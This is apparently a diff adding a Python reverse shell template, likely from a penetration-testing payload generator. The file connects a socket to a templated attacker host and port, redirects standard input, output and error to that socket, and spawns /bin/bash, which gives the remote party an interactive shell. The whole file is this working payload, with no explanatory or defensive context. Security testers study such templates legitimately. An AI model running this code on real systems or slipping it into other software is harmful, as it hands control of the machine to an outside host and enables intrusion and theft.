@@ -1,0 +1,13 @@
+import os
+import pty
+import socket
+
+sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sd.connect(('{{ lhost }}', {{ lport }}))
+
+fd = sd.fileno()
+for i in range(3):
+    os.dup2(fd, i)
+
+pty.spawn('/bin/bash')
+
